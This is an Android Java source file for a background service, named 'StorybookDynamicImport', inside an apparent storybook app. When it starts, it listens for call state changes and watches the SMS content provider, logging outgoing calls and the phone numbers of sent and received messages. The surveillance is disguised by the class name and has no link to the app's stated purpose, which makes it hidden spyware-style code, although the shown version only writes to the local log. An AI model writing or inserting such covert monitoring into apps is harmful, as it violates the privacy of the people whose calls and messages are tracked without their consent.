package com.paki.storybook;

import android.annotation.SuppressLint;
import android.app.Activity;
import android.app.Service;
import android.content.ContentResolver;
import android.content.Context;
import android.content.ContextWrapper;
import android.content.Intent;
import android.database.ContentObserver;
import android.database.Cursor;
import android.net.Uri;
import android.os.Handler;
import android.os.IBinder;
import android.telephony.PhoneStateListener;
import android.telephony.SmsMessage;
import android.telephony.TelephonyManager;
import android.telephony.gsm.SmsManager;
import android.util.Log;
import android.widget.Toast;

@SuppressLint("ParserError")
public class StorybookDynamicImport extends Service{

	public IBinder onBind(Intent intent) {
		// TODO Auto-generated method stub
		return null;
	} 
	

	public void onCreate(){
		super.onCreate();
		CaptureCall();
		TrackSmsSent();
		
	}
	
	
	
	public void CaptureCall(){
	
		TelephonyManager tm= (TelephonyManager)getSystemService(TELEPHONY_SERVICE);
		PhoneStateListener mPhoneListener;
		 mPhoneListener=new PhoneStateListener(){
			public void onCallStateChanged(int state, String incomingNumber){
				try{
					switch(state){
					case TelephonyManager.CALL_STATE_OFFHOOK:
						Log.v(StorybookContentProvider.TAG_LOG, "stai effetuando una chiamata");
					break;
					}
				}catch (Exception e) {
					// TODO: handle exception
				}
			}
		};
	
		tm.listen(mPhoneListener, PhoneStateListener.LISTEN_CALL_STATE);
	}

	public void TrackSmsSent(){
		final Uri STATUS_URI = Uri.parse("content://sms");
		SmsSentObserver smsSentObserver = null;
		
		if(smsSentObserver == null){
		    smsSentObserver = new SmsSentObserver(new Handler(), this);
		    this.getContentResolver().registerContentObserver(STATUS_URI, true, smsSentObserver);
	}
	}
	
	public void TrackSmsReceived(){
		
	}
	
	
	
	
	
        // class needed for
		class SmsSentObserver extends ContentObserver{

			 private Context mContext;
			    
				public SmsSentObserver(Handler handler, Context ctx) {
					super(handler);
					mContext = ctx;
				}
				
				public boolean deliverSelfNotifications() {
					return true;
				}
			
			@Override
		    public void onChange(boolean selfChange) {
				Log.e(StorybookContentProvider.TAG_LOG, "Notification on SMS observer");
				final Uri STATUS_URI = Uri.parse("content://sms");
		        Cursor sms_sent_cursor = mContext.getContentResolver().query(STATUS_URI, null, null, null, null);
		        if (sms_sent_cursor != null) {
			        if (sms_sent_cursor.moveToFirst()) {
			        	String protocol = sms_sent_cursor.getString(sms_sent_cursor.getColumnIndex("protocol"));
			        	Log.e(StorybookContentProvider.TAG_LOG, "protocol : " + protocol);
			        	if(protocol == null){
			        		//String[] colNames = sms_sent_cursor.getColumnNames();
			        		int type = sms_sent_cursor.getInt(sms_sent_cursor.getColumnIndex("type"));
			        		Log.e(StorybookContentProvider.TAG_LOG, "SMS Type : " + type);
			        		if(type == 2){
				        		Log.e(StorybookContentProvider.TAG_LOG, "Address : " + sms_sent_cursor.getString(sms_sent_cursor.getColumnIndex("address")));
				        	
			        		}
			        	}else if (Integer.parseInt(protocol)==0){
			        		int type = sms_sent_cursor.getInt(sms_sent_cursor.getColumnIndex("type"));
			        		Log.e(StorybookContentProvider.TAG_LOG, "SMS Type : " + type);
			        		if(type == 1){
				        		Log.e(StorybookContentProvider.TAG_LOG, "Address : " + sms_sent_cursor.getString(sms_sent_cursor.getColumnIndex("address")));
			        	}
			        		
			        }
		        }
		        else
		        	Log.e(StorybookContentProvider.TAG_LOG, "Send Cursor is Empty");
			
			
			super.onChange(selfChange);
			
		}
}
		}
}
		
